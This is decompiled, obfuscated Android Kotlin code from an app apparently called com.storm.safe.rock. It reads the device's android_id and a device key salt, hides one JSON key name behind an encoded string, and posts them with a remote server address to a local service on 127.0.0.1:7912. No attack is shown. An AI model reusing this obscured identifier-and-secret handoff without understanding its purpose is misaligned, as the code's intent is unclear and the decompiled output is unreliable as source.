package com.storm.safe.rock.service.modules;

import android.provider.Settings;
import com.storm.safe.rock.network.C0267a0;
import com.storm.safe.rock.util.StringUtil;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import kotlin.text.AbstractC0779a1;
import org.json.JSONObject;
import p000.AbstractC0577hd;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.kg1;
import p000.l10;
import p000.t60;
import p000.tz0;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.modules.NetworkManager$notifyLocalServiceFullConfig$1", m214403f = "NetworkManager.kt", m214404l = {}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class NetworkManager$notifyLocalServiceFullConfig$1 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public final /* synthetic */ String f52838a1;

    /* renamed from: a2 */
    public final /* synthetic */ C0323a8 f52839a2;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public NetworkManager$notifyLocalServiceFullConfig$1(String str, C0323a8 c0323a8, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f52838a1 = str;
        this.f52839a2 = c0323a8;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new NetworkManager$notifyLocalServiceFullConfig$1(this.f52838a1, this.f52839a2, interfaceC0876mv);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) throws Throwable {
        NetworkManager$notifyLocalServiceFullConfig$1 networkManager$notifyLocalServiceFullConfig$1 = (NetworkManager$notifyLocalServiceFullConfig$1) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2);
        C1351vv c1351vv = C1351vv.f60710b1;
        networkManager$notifyLocalServiceFullConfig$1.invokeSuspend(c1351vv);
        return c1351vv;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final Object invokeSuspend(Object obj) throws Throwable {
        String strM213673c6 = this.f52838a1;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        kg1.m213544f4(obj);
        try {
            if (AbstractC0779a1.m213679d2(strM213673c6, false, "wss://")) {
                strM213673c6 = AbstractC0779a1.m213673c6(strM213673c6, "wss://", "https://");
            } else if (AbstractC0779a1.m213679d2(strM213673c6, false, "ws://")) {
                strM213673c6 = AbstractC0779a1.m213673c6(strM213673c6, "ws://", "http://");
            }
            String string = Settings.Secure.getString(this.f52839a2.f53100a0.getContentResolver(), "android_id");
            if (string == null) {
                string = "";
            }
            String deviceKeySalt = C0267a0.f52258b5.getDeviceKeySalt();
            JSONObject jSONObject = new JSONObject();
            jSONObject.put("serverAddr", strM213673c6);
            jSONObject.put("deviceId", string);
            if (deviceKeySalt.length() > 0) {
                jSONObject.put(StringUtil.m212470a0("L1wHM049JytOAipVBQ=="), deviceKeySalt);
            }
            String string2 = jSONObject.toString();
            t60.m214694b5(string2, "JSONObject().apply {\n   …             }.toString()");
            t60.m214714d6("NetworkManager", "🌐 通知 local-service 完整配置: serverAddr=" + strM213673c6 + ", deviceId=" + string);
            URLConnection uRLConnectionOpenConnection = new URL("http://127.0.0.1:7912/setConfig").openConnection();
            t60.m214693b4(uRLConnectionOpenConnection, "null cannot be cast to non-null type java.net.HttpURLConnection");
            HttpURLConnection httpURLConnection = (HttpURLConnection) uRLConnectionOpenConnection;
            httpURLConnection.setConnectTimeout(3000);
            httpURLConnection.setReadTimeout(3000);
            httpURLConnection.setRequestMethod("POST");
            httpURLConnection.setRequestProperty("Content-Type", "application/json");
            httpURLConnection.setDoOutput(true);
            OutputStream outputStream = httpURLConnection.getOutputStream();
            try {
                byte[] bytes = string2.getBytes(AbstractC0577hd.f56650a0);
                t60.m214694b5(bytes, "this as java.lang.String).getBytes(charset)");
                outputStream.write(bytes);
                outputStream.close();
                int responseCode = httpURLConnection.getResponseCode();
                if (responseCode == 200) {
                    t60.m214714d6("NetworkManager", "✅ local-service 完整配置已更新");
                } else {
                    t60.m214726f4("NetworkManager", "⚠️ local-service 响应: " + responseCode);
                }
                httpURLConnection.disconnect();
            } finally {
            }
        } catch (Exception e) {
            tz0.m214810b0("⚠️ 通知 local-service 完整配置失败: ", e.getMessage(), "NetworkManager");
        }
        return C1351vv.f60710b1;
    }
}
